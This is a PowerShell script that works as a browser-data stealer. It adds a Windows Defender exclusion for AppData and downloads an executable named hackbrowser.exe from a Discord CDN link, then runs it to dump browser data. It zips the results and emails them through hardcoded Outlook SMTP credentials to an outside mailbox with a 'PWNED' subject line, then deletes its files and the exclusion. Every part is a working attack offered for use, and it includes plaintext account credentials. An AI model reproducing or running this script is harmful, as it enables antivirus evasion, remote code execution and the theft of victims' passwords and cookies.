
#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\dump"
Set-Location "$env:appdata\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/792864993229799494/1171596352996773990/hackbrowser.exe?ex=655d4121&is=654acc21&hm=cea4e4eb493e36193ef656f1bb62cf205168cced6bc384e833240fb5881694f3&" -OutFile "$env:appdata\dump\hackbrowser.exe"
./hackbrowser.exe
Start-Sleep -Seconds 6
Remove-Item -Path "$env:appdata\dump\hackbrowser.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("luizhenriqueff1212@outlook.com", "Henrique12@dapk");
$smtp.EnableSsl = $true
$Message.From = "luizhenriqueff1212@outlook.com"
$Message.To.Add("luizhenriqueff1212@gmail.com")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
$files=Get-ChildItem 
$Message.Attachments.Add("$env:appdata\dump\dump.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
Start-Sleep -Seconds 6
cd "$env:appdata"
Remove-Item -Path "$env:appdata\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"


